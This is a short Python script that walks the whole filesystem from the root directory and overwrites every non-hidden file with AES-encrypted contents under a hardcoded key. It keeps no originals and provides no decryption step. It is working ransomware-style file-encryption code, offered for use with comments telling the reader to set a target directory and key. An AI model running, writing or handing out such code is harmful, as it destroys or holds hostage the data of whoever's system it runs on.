import os
import subprocess
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Base directory to start encryption from
base_directory = "/"  # Change this to your target directory, avoiding encryption of system-critical directories

# AES encryption function
def encrypt_aes(key, data):
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# Function to encrypt a file
def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            contents = f.read()
        encrypted_contents = encrypt_aes(key, contents)
        with open(file_path, "wb") as f:
            f.write(encrypted_contents)
        
        print(f"Successfully encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting file: {file_path}")
        print(e)

# Recursively search for all files from the base directory
for root, dirs, filenames in os.walk(base_directory):
    # Skip the /dev directory to avoid issues with device files
    if root.startswith("/dev"):
        continue

    for filename in filenames:
        # Skip hidden files
        if filename.startswith('.'):
            continue

        file_path = os.path.join(root, filename)
        encrypt_file(file_path, b"1234567891234567")  # Replace with your own AES key

